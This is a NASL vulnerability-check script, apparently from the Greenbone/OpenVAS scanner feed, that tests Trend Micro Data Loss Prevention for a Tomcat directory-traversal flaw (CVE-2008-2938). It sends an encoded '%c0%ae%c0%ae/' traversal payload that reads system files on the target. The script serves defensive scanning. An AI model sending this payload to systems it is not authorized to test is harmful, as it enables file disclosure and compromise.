CPE = "cpe:/a:trend_micro:data_loss_prevention";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103182" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2008-2938" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-14 13:57:36 +0200 (Tue, 14 Jun 2011)" );
	script_bugtraq_id( 48225 );
	script_name( "Trend Micro Data Loss Prevention Directory Traversal Vulnerability" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "gb_trend_micro_data_loss_prevention_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8443 );
	script_mandatory_keys( "trendmicro/datalossprevention/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48225" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17388/" );
	script_xref( name: "URL", value: "http://us.trendmicro.com/us/products/enterprise/data-loss-prevention/index.html" );
	script_tag( name: "summary", value: "Trend Micro Data Loss Prevention is prone to a directory-traversal
  vulnerability because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to gain access to arbitrary files on the targeted system. This may
  result in the disclosure of sensitive information or lead to a complete compromise of the affected computer." );
	script_tag( name: "affected", value: "Trend Micro Data Loss Prevention 5.5 is vulnerable. Other versions may
  also be affected." );
	script_tag( name: "insight", value: "Trend Micro Data Loss Prevention is shipping a vulnerable Apache Tomcat
  version affected by a directory-traversal vulnerability registered with the CVE-2008-2938." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port, service: "www" )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = NASLString( dir, "//%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/" + file );
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( url: url, port: port );
		security_message( port: port, data: url );
	}
}
exit( 0 );

